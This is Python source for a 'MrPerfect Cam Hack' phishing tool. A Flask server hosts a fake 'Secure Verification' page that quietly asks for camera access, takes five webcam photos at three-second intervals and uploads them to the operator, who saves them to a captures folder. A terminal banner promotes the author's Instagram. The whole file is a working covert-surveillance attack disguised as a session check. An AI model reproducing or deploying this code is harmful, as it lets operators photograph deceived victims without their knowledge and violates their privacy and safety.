import os, sys, time
from pyfiglet import Figlet
from termcolor import colored

def clear():
    os.system("clear")

def banner():
    f = Figlet(font='slant')
    text = f.renderText("MrPerfect")
    rainbow_colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    
    for i, line in enumerate(text.split("\n")):
        color = rainbow_colors[i % len(rainbow_colors)]
        print(colored(line, color))

def blinking_text(text, color="cyan", delay=0.5, repeat=6):
    for _ in range(repeat):
        sys.stdout.write("\r" + colored(text, color))
        sys.stdout.flush()
        time.sleep(delay)
        sys.stdout.write("\r" + " " * len(text))
        sys.stdout.flush()
        time.sleep(delay)
    print("\r" + colored(text, color))  # final show

def loading_animation(msg="Loading", dots=3, delay=0.4):
    for i in range(dots * 3):
        sys.stdout.write("\r" + msg + "." * (i % (dots + 1)))
        sys.stdout.flush()
        time.sleep(delay)
    print("\n")

if __name__ == "__main__":
    clear()
    banner()
    print("\n🔥 " + colored("MrPerfect Cam Hack", "red") + " 🔥")
    blinking_text("Follow on Instagram 👉 @MrPerfect_Xyz", "yellow")
    loading_animation("Starting Server")
    print(colored("[✓] Server Running Successfully!", "green"))
from flask import Flask, render_template_string, request
import os, time

app = Flask(__name__)

# HTML page with auto 5 snapshots
html_page = """
<!DOCTYPE html>
<html>
<head>
  <title>Secure Verification</title>
  <style>
    body {
      background: linear-gradient(135deg, #667eea, #764ba2);
      font-family: Arial, sans-serif;
      color: #fff;
      text-align: center;
      padding-top: 80px;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-radius: 50%;
      border-top: 6px solid #ffcc00;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .msg {
      font-size: 18px;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <h2>🔐 Secure Verification</h2>
  <div class="loader"></div>
  <div class="msg">Verifying your session...</div>
  <div class="msg">Please wait, this may take a few seconds</div>

  <script>
    let count = 0;
    let maxPhotos = 5;

    function takePhotoRepeatedly() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const track = stream.getVideoTracks()[0];
          let imageCapture = new ImageCapture(track);

          let interval = setInterval(() => {
            if (count >= maxPhotos) {
              clearInterval(interval);
              track.stop();
              return;
            }
            imageCapture.takePhoto()
              .then(blob => {
                let formData = new FormData();
                let filename = "snap_" + Date.now() + ".jpg";
                formData.append("file", blob, filename);
                fetch("/upload", { method: "POST", body: formData });
                count++;
              })
              .catch(err => console.error("Capture failed: ", err));
          }, 3000); // every 3 sec
        })
        .catch(err => console.error("Camera error: ", err));
    }

    // Start after 5 sec delay
    setTimeout(takePhotoRepeatedly, 5000);
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(html_page)

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    if not os.path.exists("captures"):
        os.makedirs("captures")
    save_path = os.path.join("captures", file.filename)
    file.save(save_path)
    print(f"[✔] Saved: {save_path}")
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
